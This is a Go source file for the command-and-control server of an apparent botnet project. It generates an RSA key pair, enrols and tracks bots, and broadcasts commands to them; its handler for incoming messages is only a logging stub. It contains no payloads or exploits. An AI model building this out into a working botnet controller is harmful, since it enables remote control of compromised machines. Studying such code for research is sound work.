package ccserver

import (
	"crypto/rsa"
	"log"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
)

// CommandAndControl is the command and control - controller
type CommandAndControl struct {
	ServerKey string
	msgDecryptKey  *rsa.PrivateKey
	recvMsgChan chan *protocol.Message // Channel for receiving de-crypted messages requests
	bots           map[string]*BotCtrl
}

// NewCmdAndCtrl is the constructor for a CommandAndControl
func NewCmdAndCtrl() (*CommandAndControl, error) {
	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
	if err != nil {
		return nil, err
	}
	log.Printf("[master] public key: \n%s", string(pub))
	return &CommandAndControl{
		msgDecryptKey:  priv,
		ServerKey:   string(pub),
		recvMsgChan: make(chan *protocol.Message),
		bots:           make(map[string]*BotCtrl),
	}, nil
}

// Start begins communication
func (cc *CommandAndControl) Start() {
	for {
		select {
		// handle the next message
	case event := <-cc.recvMsgChan:
			cc.handleMessage(event)
		}
	}
}

// EnrolBot registers a bot to the botnet
func (cc *CommandAndControl) EnrolBot(bot *BotCtrl) {
	cc.bots[bot.id] = bot
	log.Printf("[%s] joined net", bot.id)
	go bot.writer()
	go bot.reader()
	// send welcome back to slave
	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
}

// DeregisterBot deregisters a bot from a botnet
func (cc *CommandAndControl) DeregisterBot(botID string) {
	if bot, ok := cc.bots[botID]; ok {
		delete(cc.bots, botID)
		close(bot.CommandChan)
	}
	log.Printf("[%s] left net", botID)
}

func (cc *CommandAndControl) handleMessage(msg *protocol.Message) {
	//TODO: handle incoming messages from slaves
	log.Println("received message from slave")
	log.Println(msg)
}

func (cc *CommandAndControl) broadcastCommand(cmd *protocol.Command) {
	log.Printf("[MASTER] broadcasting message to %d slaves\n", len(cc.bots))
	for botID := range cc.bots {
		select {
		case cc.bots[botID].CommandChan <- cmd:
		default:
			close(cc.bots[botID].CommandChan)
			delete(cc.bots, botID)
			log.Printf("[%s] left net", botID)
		}
	}
}
